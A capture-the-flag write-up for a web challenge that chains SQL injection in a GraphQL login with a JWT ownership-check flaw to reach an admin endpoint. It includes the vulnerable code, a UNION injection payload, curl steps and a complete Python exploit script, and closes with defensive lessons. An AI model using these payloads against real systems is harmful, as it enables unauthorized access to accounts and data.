---

title: "OhMyQl — Full Writeup"
date: 2025-11-13
categories:
  - FlagYard
tags:
 - web
 - graphql
 - sql-injection
 - jwt

---

# OhMyQl — Full Writeup

**Challenge name:** `OhMyQl`
**Type:** Web / GraphQL / SQLi → JWT abuse
**Difficulty:** Hard

> Short summary: the GraphQL server performs an unsafe string-interpolated SQL query in `database.getUser`. We exploit SQL injection to make the DB return a synthetic user row. The app creates a JWT from the returned row **using the raw `username` value you supplied**, so by carefully reusing that exact username value in a second mutation (`setFlagOwner`) we can obtain a JWT with `flagOwner: true`. That JWT unlocks `/admin` and reveals the flag.

---

## Where we got the info to exploit

The exploit comes directly from inspecting the files served with the challenge. Key files and locations that contained the needed information:

* `index.js` (the Express + GraphQL server):

  * showed `contextMiddleware` which verifies the `Authorization: Bearer <token>` header using `jwt.verify(..., JWT_SECRET)` and attaches `user` to the request context.
  * showed GraphQL `login` and `setFlagOwner` mutations and the `me` / `getUser` queries.
  * **critical lines:**

    ```js
    // database.getUser uses string interpolation (vulnerable):
    const query = `SELECT * FROM users WHERE username = '${username}'`;

    // login signs a token using the raw username variable:
    const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '6m' });

    // setFlagOwner checks that the auth token's username equals the mutation arg
    if (user.username !== username) {
      throw new Error('You can only set flag for your own account');
    }

    // setFlagOwner returns a token with flagOwner: true
    const token = jwt.sign({ username, flagOwner: true }, JWT_SECRET, { expiresIn: '6m' });
    ```

* `database.js`:

  * showed the DB schema and the **unsafe query construction**:

    ```js
    const query = `SELECT * FROM users WHERE username = '${username}'`;
    ```
  * showed the table schema used to craft the `UNION SELECT` injection: `username TEXT PRIMARY KEY, password TEXT, flagowner INTEGER DEFAULT 0`.

* `public/index.html` (login page):

  * showed how the web UI calls the GraphQL `login` mutation and stores the returned token in `localStorage`. This helped us craft the same GraphQL mutation calls via `curl`/Python.

Those files made the attack straightforward: the app is susceptible to classic SQL injection, and the JWTs include the *raw* username value (the user-controlled string we inject). Reusing that exact raw string to call `setFlagOwner` bypasses the ownership check and yields a token with `flagOwner: true` which grants access to `/admin`.

---

## Vulnerability summary

From the provided server files we observed:

* `database.getUser(username)` builds an SQL query by directly interpolating the `username` into the SQL string:

```js
const query = `SELECT * FROM users WHERE username = '${username}'`;
```

→ This is **SQL injection**.

* `login` GraphQL mutation uses `getUser(username)` and compares the returned row password against the supplied password. If it matches, the server signs a JWT:

```js
const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '6m' });
```

Notice the token payload contains exactly the `username` value (not `row.username`). In our exploit we use this to get a token whose `username` field equals the SQLi string.

* `setFlagOwner` requires authentication and checks `user.username === username` (the GraphQL arg). If they match, it signs and returns a new token with `flagOwner: true` in the payload.

* `/admin` checks the JWT and returns the flag only when `flagOwner === true`.

Putting it together: SQLi → fake row → initial JWT containing the SQLi string as `username` → call `setFlagOwner` with **that same SQLi string** → get `flagOwner` token → GET `/admin`.

---

## Exploit plan (high level)

1. Use SQL injection in `login` to cause the DB to return a made-up row with a chosen `username` and `password`.
2. Call `login` with that injected `username` string and the same chosen `password` — the server will compare the row and issue `token1`. `token1`'s payload `username` will be the raw injected string.
3. Call `setFlagOwner(username: <injected_string>)` while including `Authorization: Bearer <token1>`. The `user.username` from the token matches the supplied arg, so the mutation returns a new token (`token2`) with `flagOwner: true`.
4. Call `GET /admin` with `Authorization: Bearer <token2>` to receive the flag.

> Important detail: you must pass the **exact same injected string** you used at login when calling `setFlagOwner`. The code enforces `user.username === username`, and `token1` contains the *raw* string you supplied to login (the SQLi string), not the fake `username` value inside the returned row.

---

## SQL injection payload

Assuming the `users` table has 3 columns (`username`, `password`, `flagowner`) (as in the provided DB schema), a working union-based injection is:

```
x' UNION SELECT 'attacker','mypassword',1 --
```

If we place that as the GraphQL `login` variable `username`, then the executed SQL becomes:

```sql
SELECT * FROM users WHERE username = 'x' UNION SELECT 'attacker','mypassword',1 -- '
```

The `UNION` row provides `{ username: 'attacker', password: 'mypassword', flagowner: 1 }` to the application, and because we supplied password `mypassword`, the login check passes and the server signs a JWT for the *username value we passed to login* — i.e. the full injection string `"x' UNION SELECT 'attacker','mypassword',1 -- "`.

---

## Exploit — curl steps

Below are the core `curl` steps (useful for manual testing). Replace `HOST` with the challenge host (no trailing slash).

1. Login (SQLi) and get token1:

```bash
HOST="http://mhhbc3rh.playat.flagyard.com"
INJ="x' UNION SELECT 'attacker','mypassword',1 -- "
curl -s -X POST "$HOST/graphql" \
  -H "Content-Type: application/json" \
  -d "{\"query\":\"mutation Login($username: String!, $password: String!){ login(username:$username, password:$password) { token }}\",\"variables\":{\"username\":\"$INJ\",\"password\":\"mypassword\"}}" \
  | jq -r '.data.login.token' > token1.txt

echo "token1:"
cat token1.txt
```

2. Call `setFlagOwner` using the **same** injected string:

```bash
TOKEN1=$(cat token1.txt)
curl -s -X POST "$HOST/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN1" \
  -d "{\"query\":\"mutation SetFlagOwner(\$username: String!){ setFlagOwner(username:\$username) }\",\"variables\":{\"username\":\"$INJ\"}}" \
  | jq -r '.data.setFlagOwner' > token2.txt

echo "token2:"
cat token2.txt
```

3. Request `/admin` with `token2`:

```bash
TOKEN2=$(cat token2.txt)
curl -s "$HOST/admin" -H "Authorization: Bearer $TOKEN2"
```

If everything was successful, the last command returns the flag.

---

## Exploit — Python script (`exploit.py`)

Save the following as `exploit.py`; it automates the whole flow and decodes JWT payloads to help verify the steps:

```python
"""
exploit.py

Usage:
    python3 exploit.py URL

Dependencies:
    pip install requests
"""
import sys
import json
import requests
import base64

# ========== Config ==========
HOST = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else None
if not HOST:
    print("Usage: python3 s.py <host>")
    sys.exit(1)
GRAPHQL = HOST + "/graphql"
ADMIN = HOST + "/admin"

FAKE_USER = "attacker"
FAKE_PASS = "mypassword"

# NOTE: this is the injected string we pass as the 'username' variable to login.
# We will also reuse **this same string** as the username argument for setFlagOwner.
INJECTION = "x' UNION SELECT '{u}','{p}',1 -- ".format(u=FAKE_USER, p=FAKE_PASS)

def graphql_request(query, variables=None, token=None):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    payload = {"query": query}
    if variables is not None:
        payload["variables"] = variables
    r = requests.post(GRAPHQL, headers=headers, data=json.dumps(payload), timeout=10)
    r.raise_for_status()
    return r.json()

def decode_jwt_no_verify(token):
    try:
        parts = token.split('.')
        if len(parts) < 2:
            return None
        payload_b64 = parts[1]
        padding = '=' * (-len(payload_b64) % 4)
        payload_b64 += padding
        payload_b64 = payload_b64.replace('-', '+').replace('_', '/')
        decoded = base64.b64decode(payload_b64)
        return json.loads(decoded)
    except Exception:
        return None

# ========== Step 1: login using SQLi ==========
login_query = """
mutation Login($username: String!, $password: String!) {
  login(username: $username, password: $password) {
    token
  }
}
"""

print("[*] Sending login mutation with SQL injection payload...")
try:
    resp = graphql_request(login_query, variables={"username": INJECTION, "password": FAKE_PASS})
except Exception as e:
    print("[-] Request failed:", e)
    sys.exit(1)

if resp is None or "data" not in resp or resp["data"].get("login") is None:
    print("[-] No token returned. Response:")
    print(json.dumps(resp, indent=2))
    sys.exit(1)

token1 = resp["data"]["login"]["token"]
print("[+] Received token1:")
print(token1)
print("[*] Decoded payload (no verify):", decode_jwt_no_verify(token1))

# ========== Step 2: call setFlagOwner with the SAME injected username ==========
# IMPORTANT: use INJECTION here (the exact string that appears in token1 payload username)
setflag_query = """
mutation SetFlagOwner($username: String!) {
  setFlagOwner(username: $username)
}
"""

print("[*] Calling setFlagOwner with the same injected username (to match token)...")
try:
    resp2 = graphql_request(setflag_query, variables={"username": INJECTION}, token=token1)
except Exception as e:
    print("[-] Request failed:", e)
    sys.exit(1)

if resp2 is None or "data" not in resp2 or resp2["data"].get("setFlagOwner") is None:
    print("[-] setFlagOwner did not return a token. Response:")
    print(json.dumps(resp2, indent=2))
    sys.exit(1)

token2 = resp2["data"]["setFlagOwner"]
print("[+] Received token2 (should contain flagOwner):")
print(token2)
print("[*] Decoded payload (no verify):", decode_jwt_no_verify(token2))

# ========== Step 3: fetch /admin with token2 ==========
print("[*] Requesting /admin with token2...")
try:
    headers = {"Authorization": f"Bearer {token2}"}
    r = requests.get(ADMIN, headers=headers, timeout=10)
except Exception as e:
    print("[-] Request failed:", e)
    sys.exit(1)

print("[+] /admin status:", r.status_code)
print("[+] /admin response body:")
print(r.text)
```

**How to run**

```bash
pip install requests
python3 exploit.py http://mhhbc3rh.playat.flagyard.com
```

---

## Notes & troubleshooting

* SQLite comment syntax requires `-- ` (two dashes and a space). If you get unexpected behavior, try variations like `-- -` at the end of the injection, or use `/* ... */` to terminate the rest of the original query.
* If `login` returns no token, inspect the raw GraphQL response to see the error message. It may reveal if the `UNION` result had mismatched column counts.
* If `setFlagOwner` returns `"You can only set flag for your own account"`, it means the `username` argument didn't match the `username` inside your token. Confirm by decoding the `token1` payload (the script prints the decoded payload) and use exactly that string for the `username` variable to `setFlagOwner`.
* Tokens have short expiry in this challenge (`expiresIn: '6m'`), so do steps quickly or rerun the exploit if a token expires.

---

## Lessons learned

* Never interpolate user-input directly into SQL — **always** use parameterized queries / prepared statements.
* Be careful what data you put into JWTs. Signing the raw user-supplied string (instead of a canonical `row.username`) allowed us to pass ownership checks by reusing the injection string.
* GraphQL endpoints still need the same OWASP hygiene (input validation, parameterized DB calls, least privilege).

---

## Flag
**Flag:** `FlagY{63f22b9a59[REDACTED]}`
